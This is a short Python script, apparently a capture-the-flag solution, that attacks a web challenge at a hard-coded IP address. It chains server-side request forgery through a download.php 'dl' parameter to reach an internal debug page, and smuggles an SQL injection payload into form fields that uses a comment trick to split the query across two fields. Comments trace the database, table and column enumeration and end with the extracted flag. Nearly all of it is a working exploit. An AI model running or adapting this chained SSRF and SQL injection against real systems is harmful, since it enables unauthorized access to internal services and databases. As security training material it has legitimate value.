import random
import urllib
import requests

url = 'http://61.147.171.105:54754/download.php'

# subquery = "database()"
# ssrfw
# subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"
# cetcYssrf
# subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"
# secretname -> flag
# subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"
# value -> flag{cpg9ssnu_OOOOe333eetc_2018}
subquery = "select value from cetcYssrf LIMIT 1"

id = random.randint(1, 10000000)

d = ('http://127.0.0.1/secret/secret_debug.php?' +
        urllib.parse.urlencode({
            "s": "3",
            "txtfirst_name": "L','1',(" + subquery + "),'1'/*",
            "txtmiddle_name": "m",
            "txtLast_name": "y",
            "txtname_suffix": "Esq.",
            "txtdob": "*/,'01/10/2019",
            "txtdl_nmbr": id,
            "txtRetypeDL": id,
	   		"btnContinue2":"Continue"
            }) 
)

r = requests.get(url, params={"dl": d})
print(r.text)
